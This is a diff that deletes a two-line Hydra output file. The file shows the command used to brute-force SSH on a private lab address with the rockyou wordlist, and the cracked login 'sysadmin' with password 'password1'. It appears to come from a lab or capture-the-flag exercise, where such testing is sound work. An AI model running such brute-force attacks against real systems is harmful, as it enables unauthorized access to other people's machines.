@@ -1,2 +1,0 @@
-# Hydra v9.1 run at 2021-01-26 08:01:53 on 192.168.88.225 ssh (hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt -o sysadmin_pass.txt 192.168.88.225 ssh)
-[22][ssh] host: 192.168.88.225   login: sysadmin   password: password1
